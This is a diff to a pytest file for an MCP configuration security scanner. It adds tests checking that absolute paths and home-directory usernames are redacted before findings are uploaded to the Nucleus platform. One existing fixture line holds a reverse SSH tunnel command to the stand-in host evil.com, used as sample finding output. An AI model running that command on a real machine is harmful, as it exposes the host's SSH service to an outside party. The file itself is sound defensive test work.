@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import json
 from datetime import UTC, datetime
+from pathlib import Path
 
 import pytest
 
@@ -162,8 +163,14 @@ class TestFindingMapping:
     def test_finding_output(self) -> None:
         assert self.row["finding_output"] == "ssh -R evil.com:4444:localhost:22"
 
-    def test_finding_path(self) -> None:
-        assert self.row["finding_path"] == "/home/user/.cursor/mcp.json"
+    def test_finding_path_no_longer_the_raw_absolute_path(self) -> None:
+        """Nucleus is an external system this document is uploaded to, so the
+        raw absolute path (and the username it would carry under $HOME) must
+        not survive verbatim. See TestLocalPathRedaction below for the
+        home-directory-anchored redaction behaviour.
+        """
+        assert self.row["finding_path"] != "/home/user/.cursor/mcp.json"
+        assert "mcp.json" in self.row["finding_path"]
 
     def test_finding_result_always_fail(self) -> None:
         assert self.row["finding_result"] == "Fail"
@@ -303,3 +310,102 @@ class TestFindingPathBackfill:
         dumped = f.model_dump()
         restored = Finding(**dumped)
         assert restored.finding_path == "/Users/me/.cursor/mcp.json"
+
+
+# ── Local path redaction ──────────────────────────────────────────────────────
+
+
+class TestLocalPathRedaction:
+    """Nucleus FlexConnect JSON is uploaded to an external security platform —
+    the same "leaves the machine" category as the advisory feed (PR #46) and
+    SARIF output. Every text field, and finding_path itself, must not carry
+    this host's own scanned-config path or the operator's $HOME-derived
+    username off the machine.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _pro(self, pro_enabled: None) -> None:
+        """Activate the Pro gate for local-path-redaction tests."""
+
+    def test_cfhyg_style_remediation_is_redacted(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "home"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = cwd / "project" / "mcp.json"
+        config_path.parent.mkdir(parents=True)
+
+        finding = _make_finding(
+            finding_id="CFHYG-001",
+            remediation=f"Run: chmod 600 {config_path}",
+            finding_path=str(config_path),
+        )
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert str(config_path) not in row["finding_solution"]
+        assert str(Path("project") / "mcp.json") in row["finding_solution"]
+
+    def test_finding_path_field_is_redacted(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "home"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = cwd / "project" / "mcp.json"
+        config_path.parent.mkdir(parents=True)
+
+        finding = _make_finding(finding_path=str(config_path))
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert row["finding_path"] == str(Path("project") / "mcp.json")
+
+    def test_no_username_leaks_when_cwd_is_a_sibling_of_home(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "users" / "someusername"
+        home.mkdir(parents=True)
+        cwd = tmp_path / "checkouts" / "mcp-audit"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = home / "Library" / "mcp.json"
+        config_path.parent.mkdir(parents=True)
+
+        finding = _make_finding(
+            finding_id="CFHYG-001",
+            remediation=f"Run: chmod 600 {config_path}",
+            finding_path=str(config_path),
+        )
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert "someusername" not in json.dumps(row)
+
+    def test_content_unrelated_to_the_config_path_is_untouched(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "home"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = cwd / "mcp.json"
+
+        finding = _make_finding(
+            finding_id="TRANSPORT-003",
+            description=(
+                "Command: npx -y @modelcontextprotocol/server-filesystem /Users/shared"
+            ),
+            finding_path=str(config_path),
+        )
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert "/Users/shared" in row["finding_description"]
